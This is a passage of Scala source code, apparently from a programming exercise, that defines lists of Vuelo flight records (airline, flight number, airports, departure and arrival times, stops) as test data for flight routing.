    Vuelo(""AS"", 30, ""SEA"", 7, 0, ""SFO"", 10, 5, 0),
    Vuelo(""AS"", 93, ""SFO"", 9, 15, ""SEA"", 11, 15, 0),
    Vuelo(""AS"", 31, ""SFO"", 20, 25, ""SEA"", 12, 20, 0),
    Vuelo(""AS"", 603, ""PHX"", 8, 10, ""SEA"", 10, 0, 0),
    Vuelo(""AS"", 394, ""ORD"", 13, 20, ""PHL"", 16, 5, 0),
    Vuelo(""AS"", 202, ""SEA"", 18, 30, ""LAX"", 11, 5, 0),
    Vuelo(""AS"", 261, ""LAX"", 8, 0, ""SEA"", 10, 40, 0),
    Vuelo(""AS"", 203, ""LAX"", 9, 15, ""SEA"", 11, 50, 0),
    Vuelo(""AS"", 213, ""LAX"", 14, 20, ""SEA"", 16, 55, 0),
    Vuelo(""AS"", 143, ""SFO"", 7, 30, ""SEA"", 13, 0, 0),
    Vuelo(""AS"", 226, ""SEA"", 15, 45, ""LAX"", 18, 15, 0),
    Vuelo(""AS"", 238, ""SEA"", 13, 0, ""LAX"", 15, 30, 0),
    Vuelo(""AS"", 214, ""SEA"", 10, 15, ""LAX"", 12, 50, 0),
    Vuelo(""AS"", 188, ""SEA"", 11, 45, ""SFO"", 13, 50, 0),
    Vuelo(""AS"", 608, ""PHX"", 14, 35, ""SEA"", 17, 35, 1),
    Vuelo(""AS"", 196, ""SEA"", 17, 20, ""SFO"", 19, 25, 0),
    Vuelo(""AS"", 147, ""SFO"", 10, 25, ""SEA"", 12, 20, 0),
    Vuelo(""AS"", 228, ""SEA"", 11, 0, ""LAX"", 13, 35, 0),
    Vuelo(""AS"", 176, ""SEA"", 16, 35, ""SFO"", 18, 35, 0),
    Vuelo(""AS"", 611, ""PHX"", 17, 30, ""SEA"", 19, 20, 0),
    Vuelo(""AS"", 94, ""SEA"", 18, 59, ""SFO"", 11, 0, 0),
    Vuelo(""AS"", 88, ""SEA"", 14, 50, ""SFO"", 16, 50, 0),
    Vuelo(""AS"", 394, ""SEA"", 6, 50, ""PHL"", 16, 5, 1),
    Vuelo(""AS"", 87, ""SFO"", 14, 25, ""SEA"", 16, 20, 0),
    Vuelo(""AS"", 150, ""SEA"", 9, 40, ""SFO"", 11, 45, 0),
    Vuelo(""AS"", 27, ""LAX"", 20, 10, ""SEA"", 12, 50, 0),
    Vuelo(""AS"", 602, ""SEA"", 6, 45, ""PHX"", 10, 30, 0)
  )

  val vuelosB5= List(
    Vuelo(""AS"", 239, ""LAX"", 16, 10, ""SEA"", 18, 40, 0),
    Vuelo(""AS"", 394, ""SEA"", 6, 50, ""ORD"", 12, 28, 0),
    Vuelo(""AS"", 610, ""SEA"", 13, 40, ""PHX"", 17, 25, 0),
    Vuelo(""AS"", 612, ""SEA"", 10, 15, ""PHX"", 13, 55, 0),
    Vuelo(""AS"", 96, ""SEA"", 17, 0, ""LAX"", 19, 30, 0),
    Vuelo(""AS"", 91, ""LAX"", 7, 0, ""SEA"", 13, 5, 0),
    Vuelo(""AS"", 223, ""LAX"", 12, 0, ""SEA"", 14, 40, 0),
    Vuelo(""AS"", 22, ""SEA"", 7, 0, ""LAX"", 14, 0, 0),
    Vuelo(""AS"", 210, ""SEA"", 8, 0, ""LAX"", 10, 35, 0),
    Vuelo(""CO"", 530, ""DEN"", 16, 9, ""MSY"", 13, 51, 3),
    Vuelo(""CO"", 1708, ""ABQ"", 10, 26, ""DEN"", 11, 39, 0),
    Vuelo(""CO"", 280, ""PHX"", 10, 50, ""DFW"", 16, 7, 1),
    Vuelo(""CO"", 261, ""BOS"", 16, 45, ""DEN"", 10, 46, 1),
    Vuelo(""CO"", 891, ""DCA"", 14, 30, ""SEA"", 10, 20, 1),
    Vuelo(""CO"", 642, ""ORD"", 10, 10, ""DFW"", 14, 51, 1),
    Vuelo(""CO"", 255, ""DEN"", 20, 28, ""SEA"", 12, 14, 0),
    Vuelo(""CO"", 171, ""DEN"", 18, 30, ""SEA"", 10, 29, 0),
    Vuelo(""CO"", 629, ""DCA"", 17, 40, ""SFO"", 12, 12, 1),
    Vuelo(""CO"", 196, ""SFO"", 6, 30, ""DEN"", 15, 2, 0),
    Vuelo(""CO"", 780, ""DEN"", 16, 1, ""PHL"", 11, 40, 0),
    Vuelo(""CO"", 467, ""PHL"", 17, 40, ""PHX"", 12, 20, 1),
    Vuelo(""CO"", 578, ""DEN"", 16, 1, ""BOS"", 12, 57, 1),
    Vuelo(""CO"", 786, ""DEN"", 13, 4, ""BOS"", 19, 1, 0),
    Vuelo(""CO"", 249, ""DEN"", 18, 5, ""PHX"", 10, 10, 0),
    Vuelo(""CO"", 479, ""DEN"", 12, 0, ""LAX"", 13, 29, 0),
    Vuelo(""CO"", 390, ""ORD"", 9, 15, ""BOS"", 14, 11, 1),
    Vuelo(""CO"", 445, ""DEN"", 12, 5, ""SFO"", 13, 57, 0),
    Vuelo(""CO"", 514, ""MIA"", 12, 25, ""ORD"", 16, 26, 1),
    Vuelo(""CO"", 233, ""DFW"", 18, 45, ""DEN"", 19, 34, 0),
    Vuelo(""CO"", 562, ""PHX"", 8, 0, ""DEN"", 14, 4, 0),
    Vuelo(""CO"", 1184, ""ABQ"", 17, 25, ""DEN"", 18, 39, 0),
    Vuelo(""CO"", 840, ""DEN"", 10, 25, ""DFW"", 13, 20, 0),
    Vuelo(""CO"", 758, ""SEA"", 6, 35, ""DCA"", 17, 22, 1),
    Vuelo(""CO"", 598, ""LAX"", 15, 30, ""ORD"", 12, 46, 1),
    Vuelo(""CO"", 742, ""DEN"", 16, 14, ""ATL"", 11, 9, 0),
    Vuelo(""CO"", 174, ""LAX"", 8, 50, ""ORD"", 17, 22, 1),
    Vuelo(""CO"", 395, ""DTW"", 7, 0, ""DEN"", 11, 0, 0),
    Vuelo(""CO"", 818, ""SFO"", 8, 55, ""DEN"", 12, 25, 0),
    Vuelo(""CO"", 131, ""DCA"", 6, 45, ""LAX"", 13, 44, 2),
    Vuelo(""CO"", 846, ""PHX"", 14, 35, ""ATL"", 11, 46, 1)
  )

  //__________________________________________________

  //longitud 100

  val vuelosC1= List(
    Vuelo(""DL"", 579, ""ORD"", 6, 20, ""ATL"", 10, 3, 0),
    Vuelo(""DL"", 842, ""ATL"", 19, 1, ""PHL"", 10, 58, 0),
    Vuelo(""DL"", 700, ""ATL"", 19, 2, ""MSP"", 10, 40, 0),
    Vuelo(""DL"", 955, ""ATL"", 23, 45, ""DFW"", 12, 45, 0),
    Vuelo(""DL"", 544, ""DEN"", 9, 40, ""DFW"", 12, 24, 0),
    Vuelo(""DL"", 509, ""DFW"", 18, 56, ""DEN"", 19, 55, 0),
    Vuelo(""DL"", 784, ""DFW"", 10, 20, ""BNA"", 12, 0, 0),
    Vuelo(""DL"", 247, ""BOS"", 17, 10, ""MIA"", 10, 22, 0),
    Vuelo(""DL"", 177, ""ORD"", 18, 50, ""ATL"", 11, 39, 0),
    Vuelo(""DL"", 679, ""PVD"", 17, 5, ""ATL"", 19, 36, 0),
    Vuelo(""DL"", 152, ""SFO"", 5, 30, ""ATL"", 14, 25, 1),
    Vuelo(""DL"", 675, ""ATL"", 19, 9, ""DEN"", 10, 30, 0),
    Vuelo(""DL"", 149, ""TPA"", 9, 20, ""DFW"", 10, 52, 0),
    Vuelo(""DL"", 350, ""ATL"", 9, 2, ""BOS"", 11, 25, 0),
    Vuelo(""DL"", 946, ""DFW"", 15, 1, ""HOU"", 16, 3, 0),
    Vuelo(""DL"", 775, ""ATL"", 8, 38, ""DFW"", 11, 8, 1),
    Vuelo(""DL"", 197, ""TPA"", 16, 10, ""SEA"", 11, 5, 1),
    Vuelo(""DL"", 818, ""DTW"", 19, 50, ""ATL"", 11, 37, 0),
    Vuelo(""DL"", 296, ""PHX"", 14, 25, ""ATL"", 19, 53, 0),
    Vuelo(""DL"", 178, ""ATL"", 18, 58, ""DCA"", 10, 35, 0),
    Vuelo(""DL"", 252, ""PHX"", 16, 35, ""DFW"", 19, 48, 0),
    Vuelo(""DL"", 148, ""MIA"", 18, 0, ""ATL"", 19, 54, 0),
    Vuelo(""DL"", 324, ""TPA"", 17, 45, ""MSP"", 11, 32, 1),
    Vuelo(""DL"", 257, ""ATL"", 11, 59, ""DEN"", 13, 5, 0),
    Vuelo(""DL"", 588, ""PHX"", 12, 55, ""DFW"", 16, 15, 0),
    Vuelo(""DL"", 874, ""DFW"", 8, 20, ""DCA"", 12, 5, 0),
    Vuelo(""DL"", 908, ""DFW"", 18, 41, ""ATL"", 13, 1, 1),
    Vuelo(""DL"", 990, ""TPA"", 12, 55, ""ATL"", 14, 22, 0),
    Vuelo(""DL"", 599, ""BOS"", 20, 30, ""ATL"", 13, 5, 0),
    Vuelo(""DL"", 480, ""MSY"", 17, 35, ""ATL"", 19, 55, 0),
    Vuelo(""DL"", 593, ""ATL"", 19, 3, ""DFW"", 11, 17, 1),
    Vuelo(""DL"", 863, ""BOS"", 12, 15, ""TPA"", 15, 18, 0),
    Vuelo(""DL"", 415, ""DCA"", 17, 45, ""DFW"", 19, 53, 0),
    Vuelo(""DL"", 979, ""SFO"", 19, 0, ""LAX"", 10, 12, 0),
    Vuelo(""DL"", 310, ""DFW"", 8, 20, ""ORD"", 10, 40, 0),
    Vuelo(""DL"", 389, ""PHL"", 19, 35, ""TPA"", 13, 45, 1),
    Vuelo(""DL"", 963, ""SFO"", 21, 0, ""LAX"", 12, 6, 0),
    Vuelo(""DL"", 252, ""LAX"", 13, 35, ""DFW"", 19, 48, 1),
    Vuelo(""DL"", 691, ""DFW"", 19, 4, ""SFO"", 10, 55, 0),
    Vuelo(""DL"", 412, ""TPA"", 14, 20, ""ATL"", 15, 42, 0),
    Vuelo(""DL"", 201, ""DTW"", 5, 50, ""ATL"", 13, 7, 0),
    Vuelo(""DL"", 179, ""DFW"", 15, 40, ""LAX"", 16, 40, 0),
    Vuelo(""DL"", 187, ""ATL"", 19, 7, ""LAX"", 10, 55, 0),
    Vuelo(""DL"", 629, ""HOU"", 8, 0, ""DFW"", 10, 3, 0),
    Vuelo(""DL"", 690, ""HOU"", 16, 50, ""ORD"", 11, 14, 1),
    Vuelo(""DL"", 134, ""SFO"", 15, 30, ""ATL"", 12, 47, 0),
    Vuelo(""DL"", 143, ""LAX"", 12, 50, ""SFO"", 15, 9, 0),
    Vuelo(""DL"", 887, ""DFW"", 15, 14, ""SEA"", 17, 10, 0),
    Vuelo(""DL"", 280, ""ATL"", 16, 49, ""DCA"", 18, 30, 0),
    Vuelo(""DL"", 275, ""SFO"", 14, 0, ""LAX"", 15, 12, 0),
    Vuelo(""DL"", 367, ""BOS"", 14, 20, ""PHL"", 15, 37, 0),
    Vuelo(""DL"", 868, ""ATL"", 8, 26, ""DTW"", 10, 10, 0),
    Vuelo(""DL"", 441, ""DFW"", 18, 42, ""ABQ"", 19, 40, 0),
    Vuelo(""DL"", 842, ""HOU"", 15, 5, ""PHL"", 10, 58, 1),
    Vuelo(""DL"", 359, ""RDU"", 20, 25, ""ATL"", 11, 39, 0),
    Vuelo(""DL"", 647, ""DTW"", 16, 50, ""PHX"", 10, 35, 1),
    Vuelo(""DL"", 696, ""ATL"", 10, 16, ""STL"", 10, 50, 0),
    Vuelo(""DL"", 577, ""ATL"", 20, 56, ""MSY"", 11, 30, 0),
    Vuelo(""DL"", 364, ""DFW"", 17, 24, ""TPA"", 10, 40, 0),
    Vuelo(""DL"", 130, ""LAX"", 15, 15, ""ATL"", 12, 9, 0),
    Vuelo(""DL"", 701, ""DCA"", 17, 59, ""ATL"", 19, 48, 0),
    Vuelo(""DL"", 714, ""ATL"", 23, 47, ""DTW"", 12, 5, 0),
    Vuelo(""DL"", 885, ""BNA"", 5, 35, ""ATL"", 13, 2, 0),
    Vuelo(""DL"", 704, ""ORD"", 16, 50, ""ATL"", 19, 44, 0),
    Vuelo(""DL"", 378, ""ATL"", 15, 19, ""DCA"", 16, 55, 0),
    Vuelo(""DL"", 527, ""DFW"", 11, 47, ""ABQ"", 12, 30, 0),
    Vuelo(""DL"", 545, ""DFW"", 15, 21, ""ABQ"", 16, 5, 0),
    Vuelo(""DL"", 139, ""ATL"", 15, 14, ""LAX"", 11, 20, 3),
    Vuelo(""DL"", 951, ""DTW"", 17, 45, ""ATL"", 19, 33, 0),
    Vuelo(""DL"", 720, ""LAX"", 13, 45, ""DFW"", 19, 34, 1),
    Vuelo(""DL"", 198, ""SEA"", 13, 45, ""DFW"", 19, 27, 0),
    Vuelo(""DL"", 701, ""BOS"", 15, 45, ""ATL"", 19, 48, 1),
    Vuelo(""DL"", 487, ""BOS"", 18, 50, ""DFW"", 11, 38, 0),
    Vuelo(""DL"", 588, ""DFW"", 17, 1, ""DTW"", 10, 30, 0),
    Vuelo(""DL"", 252, ""PHX"", 16, 35, ""PHL"", 12, 45, 1),
    Vuelo(""DL"", 662, ""MSY"", 10, 5, ""ATL"", 12, 21, 0),
    Vuelo(""DL"", 317, ""DEN"", 11, 0, ""TPA"", 18, 20, 1),
    Vuelo(""DL"", 323, ""ATL"", 11, 44, ""DFW"", 14, 30, 2),
    Vuelo(""DL"", 195, ""ATL"", 16, 49, ""DFW"", 18, 5, 0),
    Vuelo(""DL"", 367, ""PHL"", 16, 10, ""MIA"", 11, 20, 1),
    Vuelo(""DL"", 901, ""ATL"", 18, 57, ""PHX"", 11, 0, 0),
    Vuelo(""DL"", 110, ""SFO"", 8, 0, ""JFK"", 16, 13, 0),
    Vuelo(""DL"", 638, ""LAX"", 18, 0, ""SFO"", 19, 15, 0),
    Vuelo(""DL"", 161, ""DFW"", 19, 10, ""LAX"", 10, 20, 0),
    Vuelo(""DL"", 139, ""DFW"", 18, 52, ""LAX"", 11, 20, 1),
    Vuelo(""DL"", 492, ""MIA"", 16, 30, ""BOS"", 19, 28, 0),
    Vuelo(""DL"", 173, ""LAX"", 16, 55, ""SEA"", 19, 23, 0),
    Vuelo(""DL"", 35, ""JFK"", 17, 35, ""LAX"", 10, 43, 0),
    Vuelo(""DL"", 832, ""DFW"", 18, 45, ""ATL"", 11, 42, 0),
    Vuelo(""DL"", 34, ""LAX"", 8, 5, ""JFK"", 15, 59, 0),
    Vuelo(""DL"", 111, ""JFK"", 17, 40, ""SFO"", 10, 52, 0),
    Vuelo(""DL"", 178, ""LAX"", 10, 40, ""DCA"", 10, 35, 1),
    Vuelo(""DL"", 307, ""ATL"", 11, 44, ""DFW"", 14, 27, 1),
    Vuelo(""DL"", 868, ""TPA"", 6, 10, ""DTW"", 10, 10, 1),
    Vuelo(""DL"", 805, ""SFO"", 20, 0, ""LAX"", 11, 15, 0),
    Vuelo(""DL"", 141, ""TPA"", 17, 55, ""LAX"", 19, 53, 0),
    Vuelo(""DL"", 174, ""SEA"", 6, 30, ""MIA"", 16, 45, 1),
    Vuelo(""DL"", 784, ""BNA"", 12, 30, ""ATL"", 14, 28, 0),
    Vuelo(""DL"", 830, ""SEA"", 15, 25, ""ATL"", 12, 48, 0),
    Vuelo(""DL"", 722, ""DFW"", 16, 50, ""ATL"", 19, 44, 0)
  )

  val vuelosC2= List(
    Vuelo(""DL"", 139, ""MSY"", 16, 25, ""LAX"", 11, 20, 2),
    Vuelo(""DL"", 252, ""LAX"", 13, 35, ""PHL"", 12, 45, 2),
    Vuelo(""DL"", 553, ""PVD"", 7, 50, ""TPA"", 12, 5, 1),
    Vuelo(""DL"", 742, ""DEN"", 17, 5, ""DFW"", 19, 50, 0),
    Vuelo(""DL"", 412, ""ATL"", 16, 48, ""RDU"", 18, 0, 0),
    Vuelo(""DL"", 989, ""DCA"", 7, 30, ""ATL"", 11, 5, 0),
    Vuelo(""DL"", 317, ""DEN"", 11, 0, ""ATL"", 16, 0, 0),
    Vuelo(""DL"", 841, ""BOS"", 15, 0, ""DFW"", 18, 8, 0),
    Vuelo(""DL"", 264, ""LAX"", 7, 0, ""ATL"", 14, 16, 0),
    Vuelo(""DL"", 618, ""SFO"", 7, 0, ""DFW"", 12, 22, 0),
    Vuelo(""DL"", 785, ""ATL"", 6, 25, ""DFW"", 13, 5, 0),
    Vuelo(""DL"", 635, ""ORD"", 8, 10, ""ATL"", 11, 1, 0),
    Vuelo(""DL"", 877, ""ORD"", 8, 30, ""DFW"", 10, 44, 0),
    Vuelo(""DL"", 620, ""SEA"", 6, 50, ""LAX"", 11, 1, 0),
    Vuelo(""DL"", 551, ""ATL"", 8, 19, ""DFW"", 11, 10, 2),
    Vuelo(""DL"", 194, ""MIA"", 7, 15, ""ATL"", 15, 8, 0),
    Vuelo(""DL"", 270, ""ATL"", 8, 41, ""SFO"", 10, 45, 0),
    Vuelo(""DL"", 286, ""PHX"", 6, 0, ""DFW"", 10, 8, 0),
    Vuelo(""DL"", 175, ""BOS"", 8, 0, ""TPA"", 12, 8, 1),
    Vuelo(""DL"", 225, ""BOS"", 6, 30, ""ATL"", 10, 7, 0),
    Vuelo(""DL"", 793, ""MSY"", 9, 30, ""DFW"", 10, 55, 0),
    Vuelo(""DL"", 996, ""DFW"", 6, 10, ""BOS"", 11, 46, 1),
    Vuelo(""DL"", 995, ""DFW"", 8, 14, ""PHX"", 14, 5, 0),
    Vuelo(""DL"", 369, ""ATL"", 8, 28, ""PHX"", 10, 25, 0),
    Vuelo(""DL"", 784, ""DFW"", 10, 20, ""ATL"", 14, 28, 1),
    Vuelo(""DL"", 192, ""SEA"", 16, 25, ""LAX"", 10, 43, 1),
    Vuelo(""DL"", 472, ""ATL"", 15, 26, ""MIA"", 17, 15, 0),
    Vuelo(""DL"", 217, ""PHL"", 8, 25, ""DFW"", 10, 43, 0),
    Vuelo(""DL"", 219, ""TPA"", 16, 15, ""DFW"", 17, 56, 0),
    Vuelo(""DL"", 445, ""ATL"", 8, 57, ""DEN"", 10, 5, 0),
    Vuelo(""DL"", 587, ""MIA"", 19, 30, ""DFW"", 11, 28, 0),
    Vuelo(""DL"", 671, ""ATL"", 8, 22, ""DFW"", 12, 7, 0),
    Vuelo(""DL"", 825, ""DFW"", 8, 11, ""SFO"", 15, 5, 0),
    Vuelo(""DL"", 331, ""SFO"", 8, 30, ""ATL"", 15, 48, 0),
    Vuelo(""DL"", 706, ""SEA"", 8, 30, ""ATL"", 15, 49, 0),
    Vuelo(""DL"", 888, ""DFW"", 8, 7, ""DEN"", 10, 0, 0),
    Vuelo(""DL"", 835, ""ATL"", 9, 26, ""SEA"", 11, 30, 0),
    Vuelo(""DL"", 817, ""DTW"", 16, 5, ""ATL"", 17, 54, 0),
    Vuelo(""DL"", 703, ""MIA"", 9, 0, ""DFW"", 10, 55, 0),
    Vuelo(""DL"", 400, ""DFW"", 9, 55, ""DCA"", 13, 40, 0),
    Vuelo(""DL"", 686, ""ATL"", 13, 19, ""PHL"", 15, 15, 0),
    Vuelo(""DL"", 574, ""MIA"", 21, 10, ""ATL"", 12, 51, 0),
    Vuelo(""DL"", 672, ""DFW"", 9, 49, ""DTW"", 13, 20, 0),
    Vuelo(""DL"", 929, ""PVD"", 8, 30, ""ATL"", 11, 4, 0),
    Vuelo(""DL"", 939, ""MSP"", 6, 0, ""ATL"", 12, 2, 0),
    Vuelo(""DL"", 661, ""DEN"", 19, 50, ""DFW"", 12, 34, 0),
    Vuelo(""DL"", 842, ""HOU"", 15, 5, ""ATL"", 18, 2, 0),
    Vuelo(""DL"", 427, ""RDU"", 8, 55, ""DFW"", 10, 51, 0),
    Vuelo(""DL"", 170, ""SEA"", 8, 30, ""MSY"", 17, 53, 1),
    Vuelo(""DL"", 375, ""ORD"", 9, 55, ""ATL"", 12, 42, 0),
    Vuelo(""DL"", 146, ""LAX"", 12, 35, ""ATL"", 19, 50, 0),
    Vuelo(""DL"", 433, ""BOS"", 8, 25, ""MIA"", 11, 36, 0),
    Vuelo(""DL"", 692, ""ATL"", 16, 46, ""ORD"", 17, 50, 0),
    Vuelo(""DL"", 915, ""DCA"", 14, 20, ""ATL"", 16, 10, 0),
    Vuelo(""DL"", 477, ""MSY"", 9, 0, ""LAX"", 10, 59, 0),
    Vuelo(""DL"", 477, ""TPA"", 7, 45, ""MSY"", 11, 2, 0),
    Vuelo(""DL"", 817, ""DTW"", 16, 5, ""DFW"", 11, 40, 3),
    Vuelo(""DL"", 542, ""DFW"", 6, 41, ""ATL"", 10, 51, 1),
    Vuelo(""DL"", 143, ""ATL"", 22, 35, ""LAX"", 12, 10, 0),
    Vuelo(""DL"", 370, ""MIA"", 11, 25, ""ORD"", 14, 55, 1),
    Vuelo(""DL"", 581, ""TPA"", 6, 0, ""DFW"", 13, 3, 0),
    Vuelo(""DL"", 860, ""ATL"", 16, 47, ""PHL"", 18, 40, 0),
    Vuelo(""DL"", 139, ""ATL"", 15, 14, ""DFW"", 17, 53, 1),
    Vuelo(""DL"", 357, ""ATL"", 8, 26, ""DFW"", 11, 8, 1),
    Vuelo(""DL"", 877, ""ORD"", 8, 30, ""HOU"", 12, 55, 1),
    Vuelo(""DL"", 463, ""DCA"", 16, 0, ""ATL"", 17, 46, 0),
    Vuelo(""DL"", 353, ""DFW"", 8, 9, ""ATL"", 12, 37, 1),
    Vuelo(""DL"", 527, ""DCA"", 8, 50, ""DFW"", 10, 52, 0),
    Vuelo(""DL"", 710, ""ATL"", 8, 19, ""DCA"", 15, 1, 0),
    Vuelo(""DL"", 394, ""ATL"", 20, 46, ""DCA"", 12, 25, 0),
    Vuelo(""DL"", 505, ""ORD"", 18, 59, ""DFW"", 11, 18, 0),
    Vuelo(""DL"", 859, ""DFW"", 8, 12, ""LAX"", 10, 19, 1),
    Vuelo(""DL"", 369, ""ATL"", 8, 28, ""LAX"", 11, 30, 1),
    Vuelo(""DL"", 941, ""DFW"", 11, 45, ""ATL"", 16, 5, 1),
    Vuelo(""DL"", 691, ""ATL"", 15, 25, ""DFW"", 18, 11, 2),
    Vuelo(""DL"", 389, ""PHL"", 19, 35, ""ATL"", 11, 37, 0),
    Vuelo(""DL"", 509, ""MIA"", 16, 10, ""DEN"", 19, 55, 1),
    Vuelo(""DL"", 703, ""MIA"", 9, 0, ""SEA"", 13, 40, 1),
    Vuelo(""DL"", 660, ""ABQ"", 13, 25, ""DCA"", 10, 45, 1),
    Vuelo(""DL"", 326, ""ATL"", 19, 5, ""BOS"", 11, 35, 0),
    Vuelo(""DL"", 142, ""ATL"", 13, 21, ""ORD"", 14, 20, 0),
    Vuelo(""DL"", 618, ""SFO"", 7, 0, ""MSY"", 14, 50, 1),
    Vuelo(""DL"", 574, ""ATL"", 23, 45, ""ORD"", 12, 30, 0),
    Vuelo(""DL"", 618, ""SFO"", 7, 0, ""ATL"", 17, 54, 2),
    Vuelo(""DL"", 335, ""ATL"", 18, 56, ""ORD"", 19, 50, 0),
    Vuelo(""DL"", 405, ""ATL"", 18, 41, ""DFW"", 19, 55, 0),
    Vuelo(""DL"", 945, ""MSP"", 7, 35, ""ATL"", 10, 48, 0),
    Vuelo(""DL"", 852, ""SFO"", 17, 55, ""DFW"", 13, 2, 0),
    Vuelo(""DL"", 367, ""BOS"", 14, 20, ""MIA"", 11, 20, 2),
    Vuelo(""DL"", 141, ""TPA"", 17, 55, ""SFO"", 12, 17, 1),
    Vuelo(""DL"", 887, ""SEA"", 17, 45, ""LAX"", 11, 9, 1),
    Vuelo(""DL"", 998, ""HOU"", 14, 55, ""DFW"", 15, 55, 0),
    Vuelo(""DL"", 394, ""DFW"", 15, 5, ""DCA"", 12, 25, 2),
    Vuelo(""DL"", 382, ""ATL"", 15, 21, ""SFO"", 17, 30, 0),
    Vuelo(""DL"", 793, ""ATL"", 8, 19, ""MSY"", 15, 0, 0),
    Vuelo(""DL"", 180, ""SFO"", 14, 30, ""DFW"", 19, 48, 0),
    Vuelo(""DL"", 309, ""DFW"", 15, 1, ""LAX"", 19, 10, 2),
    Vuelo(""DL"", 131, ""DFW"", 8, 6, ""LAX"", 12, 0, 0),
    Vuelo(""DL"", 883, ""ATL"", 18, 56, ""DFW"", 11, 25, 1),
    Vuelo(""DL"", 174, ""SEA"", 6, 30, ""DFW"", 12, 7, 0)
  )

  val vuelosC3= List(
    Vuelo(""DL"", 491, ""ATL"", 18, 59, ""MIA"", 10, 45, 0),
    Vuelo(""DL"", 766, ""ATL"", 17, 5, ""DTW"", 18, 55, 0),
    Vuelo(""DL"", 202, ""ATL"", 6, 36, ""PHL"", 12, 5, 0),
    Vuelo(""DL"", 558, ""DFW"", 20, 46, ""MIA"", 12, 15, 0),
    Vuelo(""DL"", 276, ""DFW"", 6, 24, ""TPA"", 13, 0, 0),
    Vuelo(""DL"", 546, ""DFW"", 9, 40, ""MIA"", 13, 10, 0),
    Vuelo(""DL"", 954, ""ATL"", 8, 33, ""MSP"", 10, 10, 0),
    Vuelo(""DL"", 655, ""BOS"", 8, 20, ""ATL"", 10, 59, 0),
    Vuelo(""DL"", 205, ""BOS"", 9, 45, ""ATL"", 12, 23, 0),
    Vuelo(""DL"", 376, ""ATL"", 17, 7, ""BNA"", 17, 10, 0),
    Vuelo(""DL"", 339, ""ATL"", 6, 32, ""MIA"", 11, 0, 0),
    Vuelo(""DL"", 853, ""DFW"", 18, 51, ""HOU"", 19, 55, 0),
    Vuelo(""DL"", 808, ""LAX"", 8, 0, ""TPA"", 15, 37, 0),
    Vuelo(""DL"", 701, ""BOS"", 15, 45, ""DCA"", 17, 16, 0),
    Vuelo(""DL"", 933, ""SFO"", 9, 0, ""LAX"", 10, 16, 0),
    Vuelo(""DL"", 535, ""BOS"", 8, 20, ""DCA"", 10, 0, 0),
    Vuelo(""DL"", 996, ""LAX"", 12, 30, ""DFW"", 11, 4, 0),
    Vuelo(""DL"", 170, ""SEA"", 8, 30, ""LAX"", 10, 52, 0),
    Vuelo(""DL"", 202, ""ATL"", 6, 36, ""BOS"", 10, 4, 1),
    Vuelo(""DL"", 514, ""TPA"", 19, 10, ""BOS"", 11, 54, 0),
    Vuelo(""DL"", 325, ""ATL"", 20, 57, ""MIA"", 12, 35, 0),
    Vuelo(""DL"", 314, ""ATL"", 6, 25, ""DCA"", 15, 5, 0),
    Vuelo(""DL"", 618, ""MSY"", 15, 35, ""ATL"", 17, 54, 0),
    Vuelo(""DL"", 464, ""MIA"", 9, 10, ""ATL"", 10, 58, 0),
    Vuelo(""DL"", 170, ""SEA"", 8, 30, ""TPA"", 10, 43, 2),
    Vuelo(""DL"", 527, ""DCA"", 8, 50, ""ABQ"", 12, 30, 1),
    Vuelo(""DL"", 994, ""SEA"", 8, 25, ""DFW"", 15, 40, 1),
    Vuelo(""DL"", 197, ""ATL"", 18, 46, ""SEA"", 11, 5, 0),
    Vuelo(""DL"", 167, ""MIA"", 6, 0, ""ATL"", 14, 1, 0),
    Vuelo(""DL"", 410, ""ATL"", 10, 3, ""BOS"", 12, 20, 0),
    Vuelo(""DL"", 596, ""ATL"", 6, 26, ""ORD"", 11, 5, 0),
    Vuelo(""DL"", 300, ""MSY"", 13, 35, ""ATL"", 15, 56, 0),
    Vuelo(""DL"", 402, ""DEN"", 7, 45, ""ATL"", 12, 26, 0),
    Vuelo(""DL"", 644, ""LAX"", 6, 0, ""SFO"", 10, 6, 0),
    Vuelo(""DL"", 850, ""ATL"", 6, 24, ""BOS"", 14, 5, 0),
    Vuelo(""DL"", 412, ""TPA"", 14, 20, ""DTW"", 11, 55, 3),
    Vuelo(""DL"", 657, ""ATL"", 19, 8, ""BNA"", 19, 10, 0),
    Vuelo(""DL"", 378, ""ATL"", 15, 19, ""BOS"", 18, 55, 1),
    Vuelo(""DL"", 307, ""MSY"", 13, 0, ""SFO"", 16, 50, 1),
    Vuelo(""DL"", 202, ""PHL"", 8, 55, ""BOS"", 10, 4, 0),
    Vuelo(""DL"", 209, ""DCA"", 15, 35, ""DFW"", 17, 51, 0),
    Vuelo(""DL"", 756, ""DFW"", 13, 0, ""ATL"", 17, 59, 2),
    Vuelo(""DL"", 444, ""ATL"", 8, 19, ""DFW"", 11, 9, 2),
    Vuelo(""DL"", 223, ""PHL"", 16, 0, ""ATL"", 18, 5, 0),
    Vuelo(""DL"", 442, ""LAX"", 16, 0, ""SFO"", 17, 12, 0),
    Vuelo(""DL"", 252, ""DFW"", 20, 45, ""PHL"", 12, 45, 0),
    Vuelo(""DL"", 495, ""RDU"", 9, 40, ""ATL"", 11, 4, 0),
    Vuelo(""DL"", 462, ""DFW"", 20, 24, ""DCA"", 12, 5, 0),
    Vuelo(""DL"", 412, ""RDU"", 18, 40, ""DTW"", 11, 55, 1),
    Vuelo(""DL"", 258, ""MIA"", 12, 25, ""BOS"", 15, 25, 0),
    Vuelo(""DL"", 783, ""DFW"", 13, 41, ""ATL"", 17, 48, 1),
    Vuelo(""DL"", 369, ""PHX"", 11, 5, ""LAX"", 11, 30, 0),
    Vuelo(""DL"", 981, ""ORD"", 19, 55, ""ATL"", 12, 36, 0),
    Vuelo(""DL"", 335, ""DFW"", 13, 6, ""ATL"", 17, 56, 2),
    Vuelo(""DL"", 397, ""ATL"", 18, 49, ""DFW"", 11, 36, 1),
    Vuelo(""DL"", 394, ""DFW"", 15, 5, ""ATL"", 19, 55, 1),
    Vuelo(""DL"", 618, ""DFW"", 13, 15, ""MSY"", 14, 50, 0),
    Vuelo(""DL"", 824, ""DFW"", 6, 17, ""MSY"", 13, 5, 0),
    Vuelo(""DL"", 557, ""ATL"", 15, 12, ""DFW"", 18, 11, 2),
    Vuelo(""DL"", 867, ""BOS"", 15, 25, ""ATL"", 18, 5, 0),
    Vuelo(""DL"", 477, ""TPA"", 7, 45, ""LAX"", 10, 59, 1),
    Vuelo(""DL"", 378, ""DCA"", 17, 35, ""BOS"", 18, 55, 0),
    Vuelo(""DL"", 360, ""PHX"", 14, 25, ""BOS"", 12, 40, 1),
    Vuelo(""DL"", 179, ""ATL"", 13, 24, ""DFW"", 14, 30, 0),
